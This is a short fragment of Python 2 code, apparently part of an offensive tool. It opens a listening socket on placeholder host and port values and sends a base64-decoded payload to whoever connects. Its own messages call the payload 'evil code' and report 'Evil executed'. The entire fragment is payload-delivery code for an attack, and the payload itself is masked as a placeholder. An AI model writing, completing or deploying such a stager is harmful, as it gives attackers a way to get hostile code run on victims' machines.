code = "***CODE***"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('***HOST***', ***PORT***))
s.listen(20)
print ' [>] Waiting for connection..'
s,address = s.accept()
print ' [<] Sending evil code.'
s.sendall(base64.b64decode(code) + '*' * 5)
print ' [*] Evil executed..'
s.close()
time.sleep(1)
